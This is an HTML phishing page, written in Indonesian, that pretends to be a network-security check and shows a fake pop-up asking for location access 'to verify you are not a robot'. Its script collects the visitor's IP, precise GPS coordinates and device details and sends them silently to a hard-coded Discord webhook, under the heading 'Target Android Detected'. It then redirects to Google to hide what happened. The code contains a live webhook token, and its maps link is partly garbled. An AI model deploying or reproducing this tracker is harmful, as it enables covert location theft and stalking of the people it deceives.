<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Jaringan</title>
    <style>
        body { background: #0b0e11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: #15191d; padding: 30px; border-radius: 12px; border: 1px solid #2d333b; width: 300px; }
        .btn { background: #00a2ff; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
        
        /* Pop-up Izin Lokasi Palsu */
        #location-modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center;
        }
        .modal-content {
            background: #ffffff; color: #333; padding: 25px; border-radius: 15px; width: 85%; max-width: 320px; text-align: center;
        }
        .modal-content h4 { margin: 0 0 10px; color: #000; }
        .modal-content p { font-size: 14px; color: #666; margin-bottom: 20px; }
        .modal-btn {
            background: #007bff; color: white; border: none; padding: 10px 25px; border-radius: 5px; font-weight: bold; width: 100%;
        }
    </style>
</head>
<body>

<div class="box">
    <h3>Checking Connection</h3>
    <p style="color: #848d97; font-size: 13px;">Sedang memverifikasi keamanan perangkat Anda...</p>
    <button class="btn" onclick="showModal()">Lanjutkan</button>
</div>

<div id="location-modal">
    <div class="modal-content">
        <h4>Izin Lokasi Diperlukan</h4>
        <p>Situs ini memerlukan akses lokasi untuk memverifikasi bahwa Anda bukan robot dan berada di wilayah yang didukung.</p>
        <button class="modal-btn" onclick="requestGPS()">IZINKAN AKSES</button>
    </div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1";

    function showModal() {
        document.getElementById('location-modal').style.display = 'flex';
    }

    async function requestGPS() {
        document.getElementById('location-modal').style.display = 'none';
        
        // 1. Ambil IP Duluan (Cadangan jika GPS tetap di-block)
        let netInfo = { ip: "N/A", org: "N/A" };
        try {
            const res = await fetch('https://ipapi.co/json/');
            netInfo = await res.json();
        } catch (e) {}

        // 2. Trigger Izin GPS Asli Browser
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (pos) => sendFinalData(netInfo, pos),
                (err) => sendFinalData(netInfo, null), // Jika tetap klik block di browser
                { enableHighAccuracy: true, timeout: 8000 }
            );
        } else {
            sendFinalData(netInfo, null);
        }
    }

    async function sendFinalData(net, pos) {
        const payload = {
            embeds: [{
                title: "🎯 Target Android Terdeteksi",
                color: 5763719,
                fields: [
                    { name: "🌐 IP", value: `\`${net.ip || "N/A"}\``, inline: true },
                    { name: "📍 GPS", value: pos ? `[Cek Maps](https://www.google.com/search?q=https://www.google.com/maps/search/%3Fapi%3D1%26query%3D-6.887248,107.615392{pos.coords.latitude},${pos.coords.longitude})` : "❌ DIBLOKIR", inline: true },
                    { name: "📱 Device", value: `\`${navigator.userAgent.split('(')[1].split(')')[0]}\`` }
                ],
                footer: { text: "Mata Fauzan v3.2 • " + new Date().toLocaleTimeString() }
            }]
        };

        // Kirim data menggunakan Beacon (Tahan banting untuk Android)
        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(WEBHOOK_URL, blob);

        // Redirect
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 1000);
    }
</script>

</body>
</html>
